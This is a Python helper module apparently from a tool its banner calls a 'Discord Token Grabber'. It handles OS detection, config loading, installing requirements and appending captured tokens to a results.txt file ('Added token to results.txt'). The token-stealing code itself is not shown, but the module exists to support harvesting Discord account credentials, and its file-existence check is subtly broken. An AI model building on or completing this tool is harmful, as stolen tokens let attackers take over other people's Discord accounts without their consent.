import os
import json
from datetime import datetime


class OSdiff:
    if os.name == 'nt':
        pip = "pip"
        python = "py"
        clear = "cls"
        windows = True
    else:
        pip = "pip3"
        python = "python3"
        clear = "clear"
        linux = True


class Config:
    with open("dtg/config.json", "r", encoding="utf-8") as conf:
        data = json.loads(conf.read())

    try:
        CLI_SLEEP_TIME = int(data["CLI_SLEEP_TIME"])
    except:
        CLI_SLEEP_TIME = 5
        print("- Please enter a valid value for CLI_SLEEP_TIME in dtg/config.json\n- Defaulting to 5")

    if str(data["SAVE_TO_FILE"]).lower().startswith("y"):
        SAVE_TO_FILE = True
    else:
        SAVE_TO_FILE = False


def save_results_to_file(result: str = None):
    if result is None:
        print("- Result not given!")

    if "results.txt" in os.listdir(os.getcwd()) == False:
        with open("results.txt", "a", encoding="utf-8") as filem:
            filem.write(f"\n{datetime.now()} - results.txt created!")
            print("+ Created: results.txt")

    with open("results.txt", "a", encoding="utf-8") as filew:
        filew.write(f"\n{result}")
        print("+ Added token to results.txt")


def show_logo():
    print(r"""
        ____ _____ ____ 
        |  _ \_   _/ ___|
        | | | || || |  _ 
        | |_| || || |_| |
        |____/ |_| \____|
      Discord Token Grabber
         """)



def install_requirements_file():
    os.system(f"{OSdiff.pip} install -r requirements.txt")
